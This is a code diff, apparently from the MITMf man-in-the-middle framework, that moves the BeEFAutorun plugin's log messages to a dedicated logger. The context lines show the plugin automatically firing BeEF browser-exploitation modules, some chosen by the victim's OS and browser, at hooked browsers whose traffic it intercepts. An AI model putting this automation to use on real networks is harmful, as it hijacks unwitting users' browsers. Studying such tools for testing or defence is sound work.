@@ -31,6 +31,8 @@ from time import sleep
 requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
 requests_log.setLevel(logging.WARNING)
 
+mitmf_logger = logging.getLogger('mitmf')
+
 class BeefAutorun(Inject, Plugin):
 	name     = "BeEFAutorun"
 	optname  = "beefauto"
@@ -83,7 +85,7 @@ class BeefAutorun(Inject, Plugin):
 
 					if session not in already_hooked:
 						info = beef.hook_info(session)
-						logging.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
+						mitmf_logger.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
 						already_hooked.append(session)
 						self.black_ips.append(str(info['ip']))
 
@@ -106,17 +108,17 @@ class BeefAutorun(Inject, Plugin):
 		hook_os      = session_info['os']
 
 		if len(self.All_modules) > 0:
-			logging.info("%s >> sending generic modules" % session_ip)
+			mitmf_logger.info("%s >> sending generic modules" % session_ip)
 			for module, options in self.All_modules.iteritems():
 				mod_id = beef.module_id(module)
 				resp = beef.module_run(session, mod_id, json.loads(options))
 				if resp["success"] == 'true':
-					logging.info('%s >> sent module %s' % (session_ip, mod_id))
+					mitmf_logger.info('%s >> sent module %s' % (session_ip, mod_id))
 				else:
-					logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
+					mitmf_logger.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
 				sleep(0.5)
 
-		logging.info("%s >> sending targeted modules" % session_ip)
+		mitmf_logger.info("%s >> sending targeted modules" % session_ip)
 		for os in self.Targeted_modules:
 			if (os in hook_os) or (os == hook_os):
 				browsers = self.Targeted_modules[os]
@@ -129,7 +131,7 @@ class BeefAutorun(Inject, Plugin):
 									mod_id = beef.module_id(module)
 									resp = beef.module_run(session, mod_id, json.loads(options))
 									if resp["success"] == 'true':
-										logging.info('%s >> sent module %s' % (session_ip, mod_id))
+										mitmf_logger.info('%s >> sent module %s' % (session_ip, mod_id))
 									else:
-										logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
+										mitmf_logger.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
 									sleep(0.5)
